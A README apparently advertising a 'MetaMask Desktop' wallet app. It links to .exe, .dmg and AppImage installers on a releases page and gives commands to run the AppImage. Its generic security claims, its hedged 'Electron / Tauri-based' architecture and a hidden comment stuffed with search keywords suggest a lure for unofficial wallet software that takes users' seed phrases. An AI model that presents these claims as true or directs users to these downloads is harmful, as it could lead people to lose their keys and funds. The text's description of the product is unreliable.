# MetaMask Desktop Wallet for Windows, macOS, and Linux

[English](README.md) | [简体中文](README.zh-CN.md) | [日本語](README.ja.md)

## Overview

MetaMask Desktop is a cross-platform desktop application for managing a cryptocurrency wallet, interacting with Web3 applications, and accessing decentralized ecosystems such as DeFi and NFTs.

The project provides a desktop-first alternative to the browser extension experience, offering improved stability, performance, and system-level integration for Windows, macOS, and Linux users.

<table>
<tr>
<td>
<img width="440" height="676" alt="metamask-windows" src="https://github.com/user-attachments/assets/3bebba8d-0573-477f-b371-f819172a872f" />
</td>
<td>
<img width="421" height="614" alt="metamask-linux" src="https://github.com/user-attachments/assets/7b34a5dc-08d8-471a-9fb2-c2cf1abd4bd4" />
</td>
<td>
<img width="466" height="689" alt="metamask-macos" src="https://github.com/user-attachments/assets/ad88eab3-6e04-4ced-80f9-960f7ceaf421" />
</td>
</tr>
</table>


---

## Features

- Secure management of Ethereum wallets and ERC-20 / ERC-721 assets
- Built-in Web3 provider for connecting to decentralized applications (DApps)
- Support for multiple accounts and wallet switching
- Import and export of seed phrases (mnemonic recovery)
- Custom RPC network configuration (Ethereum, Polygon, BSC, and others)
- Transaction history tracking
- Local encrypted key storage
- Optional hardware wallet support (Ledger, Trezor, depending on configuration)

---

## Key Advantages of Desktop Version

- No browser extension required
- Isolated runtime environment for improved security
- Faster startup compared to browser-based wallets
- Stable performance across different operating systems
- Better multi-network and multi-account workflow
- Suitable for both everyday users and advanced Web3 developers

---

## Installation

### Windows

Download the latest .exe installer from the [releases](../../releases/tag/v1.6.0) page
Run the installer and follow setup instructions

### macOS

Download the latest .dmg package from the [releases](../../releases/tag/v1.6.0) page
Open and drag the application into Applications folder

### Linux

Download the .AppImage file from the [releases](../../releases/tag/v1.6.0) page
Run the following commands:
```bash
chmod +x MetaMask-Desktop-1.6.0.AppImage
./MetaMask-Desktop-1.6.0.AppImage
```

## Project Architecture
- Electron / Tauri-based desktop runtime
- Web3.js / Ethers.js integration layer
- Secure local encrypted storage system
- Modular RPC provider architecture
- Isolated wallet state management

## Security Model

- Private keys are stored only on the local device
- Seed phrases are never transmitted over the network
- All sensitive data is encrypted at rest
- No centralized backend dependency for wallet operations


## License

This project is licensed under the [MIT License](/LICENSE)


<!--
## Keywords

MetaMask desktop wallet, MetaMask PC app, MetaMask Windows wallet, MetaMask macOS crypto wallet, MetaMask Linux application, Web3 desktop wallet, Ethereum wallet desktop app, DeFi wallet PC, crypto wallet application for desktop, ERC-20 wallet manager, blockchain wallet desktop client

-->
